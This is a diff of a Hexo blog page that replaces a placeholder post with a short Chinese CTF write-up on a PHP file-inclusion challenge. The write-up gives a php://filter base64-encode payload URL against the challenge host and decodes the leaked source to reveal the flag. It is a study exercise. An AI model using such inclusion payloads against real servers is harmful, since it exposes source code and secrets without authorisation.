@@ -15,14 +15,20 @@
 
 
 
+<meta name="description" content="BasicFileInclude根据题目，可以看出是一道php文件包含漏洞.">
+<meta name="keywords" content="web,php">
 <meta property="og:type" content="article">
-<meta property="og:title" content="你好，hexo">
-<meta property="og:url" content="https://hanqd.github.io/2019/03/15/你好，hexo/index.html">
+<meta property="og:title" content="Web：BasicFileInclude">
+<meta property="og:url" content="https://hanqd.github.io/2019/04/16/php3/index.html">
 <meta property="og:site_name" content="HANqd&#39;s BLOG">
+<meta property="og:description" content="BasicFileInclude根据题目，可以看出是一道php文件包含漏洞.">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-03-15T08:45:25.929Z">
+<meta property="og:image" content="https://github.com/HANqd/IMG/raw/master/img/20190317/63.PNG">
+<meta property="og:updated_time" content="2019-04-16T03:22:16.920Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="你好，hexo">
+<meta name="twitter:title" content="Web：BasicFileInclude">
+<meta name="twitter:description" content="BasicFileInclude根据题目，可以看出是一道php文件包含漏洞.">
+<meta name="twitter:image" content="https://github.com/HANqd/IMG/raw/master/img/20190317/63.PNG">
 
 <link rel="apple-touch-icon" href="/apple-touch-icon.png">
 
@@ -54,7 +60,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>你好，hexo | HANqd&#39;s BLOG</title>
+<title>Web：BasicFileInclude | HANqd&#39;s BLOG</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -264,11 +270,11 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我">
 </nav>
-      <div class="body-wrap"><article id="post-你好，hexo" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-php3" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2019/03/15/你好，hexo/" class="article-date">
-      <time datetime="2019-03-15T08:45:25.000Z" itemprop="datePublished">2019-03-15</time>
+      <a href="/2019/04/16/php3/" class="article-date">
+      <time datetime="2019-04-16T03:21:15.549Z" itemprop="datePublished">2019-04-16</time>
 </a>
 
 
@@ -283,7 +289,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      你好，hexo
+      Web：BasicFileInclude
     </h1>
   
 
@@ -293,6 +299,10 @@
         
 
         
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/php/">php</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/">web</a></li></ul>
+    </div>
+
         <div class="clearfix"></div>
       </div>
       
@@ -300,7 +310,22 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        
+        <h2 id="BasicFileInclude"><a href="#BasicFileInclude" class="headerlink" title="BasicFileInclude"></a>BasicFileInclude</h2><p>根据题目，可以看出是一道php文件包含漏洞.<br><a id="more"></a></p>
+<h3 id="php文件包含漏洞"><a href="#php文件包含漏洞" class="headerlink" title="php文件包含漏洞"></a>php文件包含漏洞</h3><ol>
+<li><a href="https://www.cnblogs.com/R4v3n/articles/9055514.html" target="_blank" rel="noopener">https://www.cnblogs.com/R4v3n/articles/9055514.html</a></li>
+<li><a href="https://www.cnblogs.com/vo-ov/p/3745638.html" target="_blank" rel="noopener">https://www.cnblogs.com/vo-ov/p/3745638.html</a></li>
+<li>php伪协议：利用文件包含漏洞：<a href="https://blog.csdn.net/qq_41289254/article/details/81388343" target="_blank" rel="noopener">https://blog.csdn.net/qq_41289254/article/details/81388343</a></li>
+</ol>
+<h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="https://github.com/HANqd/IMG/raw/master/img/20190317/63.PNG" alt></p>
+<h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><ol>
+<li>根据链接的URL：<code>http://web1.blue-whale.me:23338/?page=flag</code>，知道题目的解题类型：利用 php 流 filter： payload：<a href="http://web1.blue-whale.me:23338/?page=php://filter/convert.base64-encode/resource=flag" target="_blank" rel="noopener">http://web1.blue-whale.me:23338/?page=php://filter/convert.base64-encode/resource=flag</a></li>
+<li>通过指定末尾的文件，可以读取经 base64 加密后的文件源码，之后再 base64 解码一下就行。<br>base64:<code>aGEgaGE/IHlvdSB3YW50IGZsYWc/IGZsYWcgaXMgaGVyZTw/cGhwDQovLyB0cnkgdG8gcmVhZCB0aGlzIHNvdXJjZSBjb2RlDQovLyRmbGFnID0gJ2ZsYWd7cmVhbGx5X2Jhc2ljX3NraWxsX3dlYl9kb2dfc2hvdWxkX2tub3d9JzsNCj8+LCBidXQgZG9uJ3QgbGV0IHlvdSBzZWUhDQo=</code><br>解码：<code>ha ha? you want flag? flag is here&lt;?php
+// try to read this source code
+//$flag = &#39;flag{really_basic_skill_web_dog_should_know}&#39;;
+?&gt;, but don&#39;t let you see!</code></li>
+<li>这里就是在文件中包含了php代码。</li>
+</ol>
+
       
     </div>
     
@@ -308,13 +333,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2019/03/15/你好，hexo/">你好，hexo</a></p>
+        <p><span>本文标题:</span><a href="/2019/04/16/php3/">Web：BasicFileInclude</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">HANqd</a></p>
-        <p><span>发布时间:</span>2019-03-15, 16:45:25</p>
-        <p><span>最后更新:</span>2019-03-15, 16:45:25</p>
+        <p><span>发布时间:</span>2019-04-16, 11:21:15</p>
+        <p><span>最后更新:</span>2019-04-16, 11:22:16</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2019/03/15/你好，hexo/" title="你好，hexo">https://hanqd.github.io/2019/03/15/你好，hexo/</a>
-            <span class="copy-path" data-clipboard-text="原文: https://hanqd.github.io/2019/03/15/你好，hexo/　　作者: HANqd" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2019/04/16/php3/" title="Web：BasicFileInclude">https://hanqd.github.io/2019/04/16/php3/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://hanqd.github.io/2019/04/16/php3/　　作者: HANqd" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -326,16 +351,10 @@
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2019/03/17/Python数据类型（字符串）/">
-                    Python笔记——数据类型（字符串）
-                </a>
-            </div>
-        
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2019/03/15/hello-world/">
-                    Hello World
+                <a href="/2019/04/15/php2/">
+                    Web：Basic PHP2
                 </a>
             </div>
         
@@ -347,7 +366,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#BasicFileInclude"><span class="toc-number">1.</span> <span class="toc-text">BasicFileInclude</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#php文件包含漏洞"><span class="toc-number">1.1.</span> <span class="toc-text">php文件包含漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#题目描述"><span class="toc-number">1.2.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#题目分析"><span class="toc-number">1.3.</span> <span class="toc-text">题目分析</span></a></li></ol></li></ol>
         
     </div>
     <style>
@@ -383,7 +402,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"你好，hexo　| HANqd's BLOG　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"Web：BasicFileInclude　| HANqd's BLOG　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -399,7 +418,7 @@
     
       <div class="duoshuo" id="comments">
     <div id="comment-box"></div>
-    <div class="ds-thread" id="ds-thread" data-thread-key="2019/03/15/你好，hexo/" data-title="你好，hexo" data-url="https://hanqd.github.io/2019/03/15/你好，hexo/"></div>
+    <div class="ds-thread" id="ds-thread" data-thread-key="2019/04/16/php3/" data-title="Web：BasicFileInclude" data-url="https://hanqd.github.io/2019/04/16/php3/"></div>
     <script>
         var duoshuoQuery = {short_name:""};
         var loadComment = function(){
@@ -422,15 +441,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2019/03/17/Python数据类型（字符串）/" title="上一篇: Python笔记——数据类型（字符串）">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
 
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2019/03/15/hello-world/" title="下一篇: Hello World">
+            <a href="/2019/04/15/php2/" title="下一篇: Web：Basic PHP2">
                 <i class="fa fa-angle-right"></i>
             </a>
         
